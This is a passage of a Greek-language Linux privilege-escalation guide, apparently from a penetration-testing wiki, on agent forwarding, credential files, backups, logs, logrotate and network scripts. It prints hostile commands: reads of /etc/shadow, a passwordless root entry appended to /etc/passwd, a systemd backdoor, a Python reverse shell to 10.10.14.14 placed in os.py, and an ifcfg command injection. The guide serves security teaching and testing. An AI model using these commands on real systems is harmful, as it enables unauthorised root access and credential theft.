Αυτή η ρύθμιση υποδεικνύει ότι, αν προσπαθήσεις να συνδεθείς με το **ιδιωτικό** κλειδί του χρήστη "**testusername**", το ssh θα συγκρίνει το δημόσιο κλειδί σου με εκείνα που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σάς επιτρέπει να **χρησιμοποιείτε τα τοπικά σας κλειδιά SSH αντί να αφήνετε κλειδιά** (χωρίς passphrases!) στον server σας. Έτσι, θα μπορείτε να κάνετε **jump** μέσω ssh **σε έναν host** και από εκεί να κάνετε **jump σε άλλον** host **χρησιμοποιώντας** το **κλειδί** που βρίσκεται στον **αρχικό host** σας.

Πρέπει να ορίσετε αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:

```
Host example.com
  ForwardAgent yes
```

Παρατηρήστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης συνδέεται σε διαφορετικό μηχάνημα, αυτός ο host θα έχει πρόσβαση στα keys (κάτι που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **επιλογές** και να επιτρέψει ή να απαγορεύσει αυτήν τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** το ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (η προεπιλογή είναι να επιτρέπεται).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε κάποιο περιβάλλον, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να το καταχραστείτε για να κλιμακώσετε τα δικαιώματά σας**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Ενδιαφέροντα αρχεία

### Αρχεία Profiles

Το αρχείο `/etc/profile` και τα αρχεία στον κατάλογο `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κλιμακώσετε τα δικαιώματά σας**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Αν εντοπιστεί κάποιο περίεργο script προφίλ, θα πρέπει να το ελέγξετε για **ευαίσθητες πληροφορίες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το λειτουργικό σύστημα, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει κάποιο αντίγραφο ασφαλείας. Επομένως, συνιστάται να **τα εντοπίσετε όλα** και να **ελέγξετε αν μπορείτε να τα διαβάσετε**, για να δείτε **αν περιέχουν hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή σε αντίστοιχο αρχείο)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Εγγράψιμο /etc/passwd

Αρχικά, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις παρακάτω εντολές.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Στη συνέχεια, προσθέστε τον χρήστη `hacker` και τον κωδικό πρόσβασης που δημιουργήθηκε.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Τώρα μπορείς να χρησιμοποιήσεις την εντολή `su` με τα στοιχεία `hacker:hacker`

Εναλλακτικά, μπορείς να χρησιμοποιήσεις τις παρακάτω γραμμές για να προσθέσεις έναν dummy χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να μειώσεις την τρέχουσα ασφάλεια του μηχανήματος.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD, το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, ενώ το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.

Θα πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε ορισμένα ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Για παράδειγμα, αν το μηχάνημα εκτελεί έναν server **tomcat** και μπορείς να **τροποποιήσεις το αρχείο διαμόρφωσης της υπηρεσίας Tomcat μέσα στο /etc/systemd/**, τότε μπορείς να τροποποιήσεις τις γραμμές:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Η backdoor σου θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι ενδέχεται να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσεις να διαβάσεις τον τελευταίο, αλλά δοκίμασε)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Ασυνήθιστες τοποθεσίες/αρχεία που ανήκουν σε χρήστη

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Τροποποιημένα αρχεία τα τελευταία λεπτά

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Αρχεία βάσεων δεδομένων SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Για βάσεις δεδομένων εφαρμογών που είναι αναγνώσιμες, ελέγξτε τα ονόματα πινάκων και στηλών για usernames και password hashes. Ο εντοπισμός ενός hash, η ανάκτηση του αντίστοιχου password και η απόδειξη ότι χρησιμοποιείται ξανά για έναν τοπικό λογαριασμό είναι ξεχωριστά βήματα· μια γενική δεκαεξαδική συμβολοσειρά 32 χαρακτήρων δεν αρκεί για να συμπεράνετε ότι πρόκειται για MD5 ή ότι παρέχει πρόσβαση σε λογαριασμό.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Αν ένα αναγνώσιμο shell history περιέχει μια εντολή `sudo` και ακολουθείται από μια σύντομη γραμμή που μοιάζει με κωδικό πρόσβασης, ελέγξτε χειροκίνητα τις γύρω γραμμές. Ένας κωδικός πρόσβασης που πληκτρολογείται στη συνηθισμένη προτροπή του `sudo` δεν αποθηκεύεται στο shell history· μια επόμενη γραμμή είναι απλώς πιθανή τυχαία είσοδος στο shell, όχι απόδειξη έγκυρου κωδικού πρόσβασης. Ο δείκτης `.sudo_as_admin_successful` καταγράφει προηγούμενη χρήση, όχι τρέχουσα εξουσιοδότηση.

### Κρυφά αρχεία

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binaries στο PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Αρχεία Web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Αντίγραφα ασφαλείας**

Επιθεωρήστε τα αναγνώσιμα αρχεία μέσα σε καταλόγους αντιγράφων ασφαλείας, καθώς και αρχεία των οποίων τα **ονόματα** περιέχουν `backup`: ένα αρχείο με αδιαφανές όνομα ή κρυπτογραφημένη επέκταση μπορεί και πάλι να εκθέτει παλιά δεδομένα εφαρμογής. Ένα κρυπτογραφημένο αρχείο αποτελεί μόνο πιθανή έκθεση. Η ανάκτηση του κωδικού πρόσβασης, η επιθεώρηση των περιεχομένων του, η ανάκτηση ενός hash εφαρμογής και η επαναχρησιμοποίηση αυτού του κωδικού για λογαριασμό Unix είναι ξεχωριστά βήματα που πρέπει να επαληθευτούν· ένα hash μέσα σε αρχείο δεν αποδεικνύει ότι είναι δυνατή η τοπική σύνδεση.

Τα αναγνώσιμα αντίγραφα ασφαλείας εικονικών μηχανών απαιτούν την ίδια επιθεώρηση. Μια διαμόρφωση VirtualBox `.vbox` μπορεί να προσδιορίζει συνδεδεμένα images `.vdi` και να περιέχει μεταδεδομένα κλειδιού κρυπτογράφησης δίσκου· [η τεκμηρίωση του VirtualBox αναφέρει ότι το κλειδί δεδομένων κρυπτογράφησης αποθηκεύεται στη διαμόρφωση της VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Τόσο η διαμόρφωση όσο και το image πρέπει να είναι προσβάσιμα για να είναι δυνατή η offline επιθεώρηση του δίσκου. Ένας τόμος guest μπορεί να διαθέτει το δικό του [επίπεδο κρυπτογράφησης LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), το οποίο απαιτεί ξεχωριστό κλειδί. Ακόμη και μετά από εξουσιοδοτημένη αποκρυπτογράφηση, παλιά scripts ή αρχεία διαμόρφωσης μπορεί να περιέχουν κωδικό πρόσβασης· διαπιστώστε ότι τα διαπιστευτήρια εξακολουθούν να ισχύουν για λογαριασμό host και ότι η ενεργή πολιτική `sudo` επιτρέπει μια προνομιούχα εντολή, προτού το χαρακτηρίσετε τοπική κλιμάκωση προνομίων. Κατά την παθητική απαρίθμηση, καταγράψτε τις διαδρομές και τα δικαιώματα χωρίς να αντιγράφετε, να αποκρυπτογραφείτε ή να προσαρτάτε images.

Κατά την επιθεώρηση ενός αναγνώσιμου αρχείου, πρώτα καταγράψτε τα ονόματα των μελών του και έπειτα εξαγάγετε οτιδήποτε: μπορεί να υπάρχουν κρυφά αρχεία authenticator, υλικό ανάκτησης κωδικών ή κλειδιά SSH, ακόμη κι αν τα ενεργά αντίγραφα είναι προστατευμένα. Τα ονόματα αρχείων αποτελούν μόνο ένδειξη· επαληθεύστε ξεχωριστά το υλικό και τυχόν επαναχρησιμοποίηση λογαριασμού.

Δώστε προτεραιότητα στα **αναγνώσιμα αρχεία που ανήκουν σε άλλον χρήστη** και βρίσκονται σε καταλόγους αντιγράφων ασφαλείας, ιδιαίτερα σε αρχεία που ανήκουν στον root και σε όσα είναι προσβάσιμα μέσω συμμετοχής σε ομάδα. Ένα παλιό αρχείο μπορεί να περιέχει μυστικό διαμόρφωσης ή ταυτοποίησης, ακόμη κι όταν το ενεργό αντίγραφο είναι προστατευμένο. Για ένα τοπικό UI αντιγράφων ασφαλείας, όπως το [Backrest](https://garethgeorge.github.io/backrest/), ελέγξτε τον ενεργό λογαριασμό της υπηρεσίας και αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να διαβάσει τη διαμόρφωσή της ή να ταυτοποιηθεί στο UI. Τα [hooks](https://garethgeorge.github.io/backrest/docs/hooks) και η [διεπαφή εντολών restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) μπορούν να λειτουργούν με τα δικαιώματα αρχείων και εντολών του daemon· το ότι ένας listener ακούει μόνο στο loopback δεν καθορίζει από μόνο του τον αντίκτυπο. Το `passwordBcrypt` του Backrest είναι hash bcrypt κωδικοποιημένο σε base64, όπως αναφέρεται στον [κώδικα ταυτοποίησής του](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), και όχι κωδικός πρόσβασης σε απλό κείμενο. Επιβεβαιώστε την ταυτότητα της υπηρεσίας, την ύπαρξη χρησιμοποιήσιμων διαπιστευτηρίων και την πρόσβαση στο σχετικό plan ή repository, προτού θεωρήσετε ότι ένα εκτεθειμένο αρχείο ή UI αποτελεί όριο προνομίων.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), το οποίο αναζητά **διάφορα πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμη ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι το [**LaZagne**](https://github.com/AlessandroZ/LaZagne), μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή με Windows, Linux ή Mac.

Αν είναι δυνατή η ανάγνωση του `/etc/guacamole/guacamole.properties`, εξετάστε τις ρυθμίσεις σύνδεσης βάσης δεδομένων `mysql-*`, `postgresql-*` ή `sqlserver-*`. Αν ο λογαριασμός έχει εξουσιοδότηση να διαβάζει τους πίνακες JDBC του Guacamole, ο πίνακας `guacamole_connection_parameter` ενδέχεται να περιέχει αποθηκευμένες τιμές SSH για `username`, `password`, `private-key` ή `passphrase`. Ξεκινήστε με τα ID σύνδεσης και τα ονόματα παραμέτρων και, στη συνέχεια, εξετάστε μόνο τις σχετικές γραμμές· μια αποθηκευμένη τιμή μπορεί να είναι δυναμικό token ή αναφορά σε vault και όχι επαναχρησιμοποιήσιμο μυστικό. Δείτε το [σχήμα JDBC του Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) και τις [παραμέτρους σύνδεσης SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Ο [διαχειριστής κωδικών pswm](https://github.com/Julynx/pswm#usage) αποθηκεύει από προεπιλογή ένα κρυπτογραφημένο vault στο `~/.local/share/pswm/pswm`. Αν είναι ορατό το vault κάποιου άλλου χρήστη, ελέγξτε τον κάτοχό του και αν ο λογαριασμός σας μπορεί πράγματι να το διαβάσει. Η διαδρομή του vault από μόνη της δεν αποκαλύπτει διαπιστευτήρια· η ανάκτηση του κύριου κωδικού πρόσβασής του, η εύρεση ενός επαναχρησιμοποιήσιμου κωδικού πρόσβασης λογαριασμού και η επιβεβαίωση των δικαιωμάτων αυτού του λογαριασμού είναι ξεχωριστά βήματα.

Η [προεπιλεγμένη βάση δεδομένων του Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) είναι η `~/.passpie/`, με ένα keyring `.keys` και κρυπτογραφημένα αρχεία διαπιστευτηρίων `.pass` μέσα σε καταλόγους ομάδων. Ένας ορατός κατάλογος βάσης δεδομένων αποτελεί μόνο ένδειξη διαδρομής: επιβεβαιώστε ότι έχετε πρόσβαση στο κλειδί και στη σχετική κρυπτογραφημένη εγγραφή, ότι διαθέτετε τυχόν απαιτούμενη κύρια φράση πρόσβασης και ότι το διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό με περισσότερα δικαιώματα. Το Passpie υποστηρίζει επίσης [προσαρμοσμένες διαδρομές βάσης δεδομένων](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), επομένως η προεπιλεγμένη διαδρομή δεν καλύπτει όλες τις περιπτώσεις. Η αυτοματοποιημένη απαρίθμηση θα πρέπει να εμφανίζει μεταδεδομένα χωρίς να εξάγει διαπιστευτήρια ή να εκτυπώνει υλικό κλειδιών.

### Αρχεία καταγραφής

Αν μπορείτε να διαβάσετε αρχεία καταγραφής, ενδέχεται να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανότατα).\
Επίσης, ορισμένα «**κακώς**» ρυθμισμένα (με backdoor;) **αρχεία καταγραφής audit** ενδέχεται να σας επιτρέπουν να **καταγράφετε κωδικούς πρόσβασης** μέσα στα αρχεία καταγραφής audit, όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Για να **διαβάσετε αρχεία καταγραφής, η ομάδα** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) θα φανεί πολύ χρήσιμη.

### Αρχεία shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Γενική αναζήτηση Creds/Regex

Θα πρέπει επίσης να ελέγξεις για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή στο **περιεχόμενό** τους, καθώς και για IP και email μέσα σε logs ή για regexps hashes.\
Δεν θα παραθέσω εδώ πώς να τα κάνεις όλα αυτά, αλλά αν ενδιαφέρεσαι μπορείς να δεις τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν ξέρεις **από πού** πρόκειται να εκτελεστεί ένα python script και **μπορείς να γράψεις μέσα** σε αυτόν τον φάκελο ή μπορείς να **τροποποιήσεις python libraries**, μπορείς να τροποποιήσεις τη βιβλιοθήκη του OS και να της προσθέσεις backdoor (αν μπορείς να γράψεις στον φάκελο όπου πρόκειται να εκτελεστεί το python script, κάνε copy και paste τη βιβλιοθήκη os.py).

Για να **προσθέσεις backdoor στη βιβλιοθήκη**, απλώς πρόσθεσε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (άλλαξε τα IP και PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Εκμετάλλευση του logrotate

Μια προνομιακή εργασία `logrotate` μπορεί να δημιουργήσει διαδρομή εγγραφής αρχείου μεταξύ χρηστών, όταν περιστρέφει πράγματι ένα log που βρίσκεται κάτω από κατάλογο τον οποίο ένας χρήστης με χαμηλότερα προνόμια μπορεί να αντικαταστήσει ή να ανακατευθύνει κατά τη διάρκεια της περιστροφής. Ένα εγγράψιμο log από μόνο του είναι απλώς ένδειξη προς διερεύνηση. Επιβεβαιώστε τον ακριβή ενεργό κανόνα και τις οδηγίες `create`, `olddir` και `su`· την ταυτότητα με την οποία εκτελείται ο χρονοπρογραμματιστής· τα δικαιώματα εγγραφής και αναζήτησης στον γονικό κατάλογο του log· και αν η εγκατεστημένη έκδοση και η πολιτική επιτρέπουν την αλλαγή του προορισμού. Για να οδηγήσει η εγγραφή σε αρχείο εκκίνησης στην εκτέλεση εντολών, πρέπει επίσης ένα μεταγενέστερο προνομιακό shell να φορτώσει το αρχείο που προέκυψε. Εξετάστε το πρόγραμμα εκτέλεσης, τον κανόνα, την έκδοση/συσκευασία και τα μεταδεδομένα της διαδρομής, χωρίς να προκαλέσετε περιστροφή ή να επιχειρήσετε το race.

> [!TIP]
> Μην αντιμετωπίζετε την έκδοση `3.18.0` ή οποιαδήποτε συμβολοσειρά έκδοσης από μόνη της ως όριο εκμεταλλευσιμότητας. Το [αρχείο αλλαγών του upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) καταγράφει ενισχύσεις για καταλόγους και symlinks σε πολλαπλές εκδόσεις, ενώ οι διανομές μπορεί να έχουν ενσωματώσει διορθώσεις σε παλαιότερες εκδόσεις. Το [εγχειρίδιο του upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) συνιστά τη χρήση του `su` όταν το root περιστρέφει logs σε καταλόγους που ελέγχονται από μη προνομιούχους χρήστες· επαληθεύστε τον ενεργό κανόνα και την πραγματική συμπεριφορά.

Περισσότερες πληροφορίες σχετικά με την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια μοιάζει πολύ με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs του nginx),** επομένως, όταν διαπιστώνετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και αν μπορείτε να κλιμακώσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Ένα αρχείο `ifcfg-*` αποτελεί ένδειξη προς διερεύνηση όταν ένας χρήστης με χαμηλότερα προνόμια μπορεί να το δημιουργήσει ή να το τροποποιήσει **και** μια προνομιακή διαδρομή ενεργοποίησης δικτύου πρόκειται να διαβάσει το συγκεκριμένο αρχείο. Επιβεβαιώστε τα πραγματικά δικαιώματα του αρχείου και του καταλόγου, την επιλεγμένη διεπαφή, την υλοποίηση των `ifup`/`ifdown` που είναι εγκατεστημένη και ποιος τα καλεί. Ένα εγγράψιμο αρχείο από μόνο του δεν προκαλεί εκτέλεση. Ο [οδηγός δικτύωσης του Red Hat για το RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) διακρίνει τα παλαιού τύπου network scripts από το NetworkManager: το δεύτερο δεν ενεργοποιεί από μόνο του τα πρώτα. Η [τεκμηρίωση του RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) αναφέρει ότι τα προεπιλεγμένα `ifup`/`ifdown` χρησιμοποιούν το NetworkManager, ενώ το προαιρετικό πακέτο παλαιού τύπου παρέχει shell scripts.

Σε σύστημα που χρησιμοποιεί πράγματι προνομιακά scripts παλαιού τύπου, μια ανάθεση `ifcfg-*` όπως η `NAME=`, η οποία δεν περικλείεται σε εισαγωγικά και φορτώνεται από το shell, μπορεί να περάσει ένα όριο εκτέλεσης κώδικα. Επαληθεύστε τον ακριβή parser, την τιμή και τη διαδρομή ενεργοποίησης· μην συμπεραίνετε ότι γίνεται επεξεργασία από shell μόνο από το όνομα αρχείου ή την παρουσία του NetworkManager. Ένα wrapper που επιτρέπεται μέσω sudo, γράφει είσοδο του καλούντος σε αρχείο `ifcfg-*` και στη συνέχεια καλεί το παλαιού τύπου `ifup`, αποτελεί ξεχωριστή διαδρομή προς αυτό το όριο, ακόμη κι όταν ο καλών δεν μπορεί να επεξεργαστεί απευθείας το αρχείο.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Σημειώστε το κενό διάστημα μεταξύ Network και /bin/id_)

### **init, init.d, systemd και rc.d**

Ο κατάλογος `/etc/init.d` περιέχει **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και, μερικές φορές, `reload` υπηρεσιών. Μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Στα συστήματα Redhat υπάρχει και η εναλλακτική διαδρομή `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **σύστημα διαχείρισης υπηρεσιών** που εισήγαγε το Ubuntu και χρησιμοποιεί αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα scripts του SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις του Upstart, χάρη σε ένα επίπεδο συμβατότητας του Upstart.

Το **systemd** είναι ένας σύγχρονος διαχειριστής αρχικοποίησης και υπηρεσιών, με προηγμένες λειτουργίες όπως εκκίνηση daemon κατ' απαίτηση, διαχείριση automount και στιγμιότυπα κατάστασης συστήματος. Οργανώνει τα αρχεία στο `/usr/lib/systemd/` για τα πακέτα της διανομής και στο `/etc/systemd/system/` για τις τροποποιήσεις διαχειριστών, απλοποιώντας τη διαδικασία διαχείρισης του συστήματος.<sup>[[21]](#references)</sup>

## Άλλα κόλπα

### Κλιμάκωση προνομίων μέσω NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Διαφυγή από περιορισμένα Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworks rooting Android: κατάχρηση manager-channel

Τα frameworks rooting Android συνήθως κάνουν hook σε ένα syscall για να εκθέσουν προνομιούχες λειτουργίες του kernel σε έναν userspace manager. Η αδύναμη αυθεντικοποίηση του manager (π.χ. έλεγχοι υπογραφής με βάση τη σειρά FD ή ανεπαρκή σχήματα κωδικών πρόσβασης) μπορεί να επιτρέψει σε μια τοπική εφαρμογή να προσποιηθεί ότι είναι ο manager και να αποκτήσει root σε συσκευές που έχουν ήδη γίνει root. Μάθετε περισσότερα και δείτε λεπτομέρειες για την εκμετάλλευση εδώ:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Εντοπισμός υπηρεσίας VMware Tools και LPE (CWE-426) μέσω exec βασισμένου σε regex (CVE-2025-41244)

Ο εντοπισμός υπηρεσιών μέσω regex στο VMware Tools/Aria Operations μπορεί να εξαγάγει μια διαδρομή binary από τις γραμμές εντολών διεργασιών και να την εκτελέσει με -v υπό προνομιούχο context. Χαλαρά patterns (π.χ. όσα χρησιμοποιούν \S) μπορεί να αντιστοιχίσουν listeners που έχει τοποθετήσει ο επιτιθέμενος σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern που εφαρμόζεται και σε άλλα stacks εντοπισμού/παρακολούθησης εδώ:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες ασφάλειας Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static binaries του impacket](https://github.com/ropnop/impacket_static_binaries)

## Εργαλεία Privesc για Linux/Unix

### **Καλύτερο εργαλείο για την αναζήτηση vectors τοπικής κλιμάκωσης προνομίων Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(επιλογή -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
